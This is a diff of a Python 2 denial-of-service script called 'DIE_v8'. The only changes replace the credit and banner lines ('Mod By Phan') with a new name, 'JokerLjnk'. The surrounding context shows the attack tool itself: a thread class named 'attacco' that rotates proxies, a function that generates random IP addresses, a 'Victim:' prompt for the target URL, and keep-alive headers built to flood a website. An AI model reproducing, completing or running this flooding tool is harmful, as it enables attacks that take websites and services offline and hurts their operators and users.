@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #coding: utf-8
-#..:: > DIE_v8 < ::.. Mod By Phan
+#..:: > DIE_v8 < ::.. Mod By JokerLjnk
 
 import random
 import socket
@@ -178,7 +178,7 @@ class MonitorThread(threading.Thread):
 			if flag==2:
 				print ''
 
-#DIE_v8 Mod By Duong Thành
+#DIE_v8 Mod By JokerLjnk
 def randomIp():
     random.seed()
     result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
@@ -226,8 +226,8 @@ class attacco(threading.Thread):
                 proxy = random.choice(listaproxy).split(':')
 
 #Main
-print '\n\t..:: > Edit Code By Phan < ::..'
-print '\t  ==> #~~  Ddos Super ~~# <==  '
+print '\n\t..:: > Code By JokerLjnk < ::..'
+print '\t  ==> #~~ Super  DDOS ~~# <==  '
 # Site
 url = raw_input("Victim: ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
@@ -245,7 +245,7 @@ accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
 nload = 1
 x = 0
-print("\tDIE_v8 DDOS Edit By Phan")
+print("\tDIE_v8 DDOS Mod By JokerLjnk")
 if url.count("/")==2:
     url = url + "/"
     m = re.search('http\://([^/]*)/?.*', url)
